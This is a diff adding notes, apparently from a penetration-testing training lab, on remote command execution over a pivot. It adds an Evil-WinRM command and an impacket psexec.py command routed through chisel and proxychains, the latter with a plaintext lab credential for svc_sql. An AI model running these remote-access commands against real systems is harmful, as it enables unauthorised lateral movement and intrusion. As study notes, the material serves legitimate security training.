@@ -53,3 +53,23 @@ Invoke-Command -ComputerName "$hostname.$domainName" -Credential $cred -ScriptBl
 
 
 ## Enter-PSSession
+
+
+## Evil-Winrm
+
+With a pivot host and chisel + proxychains
+
+```powershell
+proxychains evil-winrm -i $ip -u $user -p $password
+```
+
+
+## psexec.py
+
+With a pivot host and chisel + proxychains 
+
+```powershell
+proxychains tools/impacket/examples/psexec.py INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50
+```
+
+mstsc.exe 
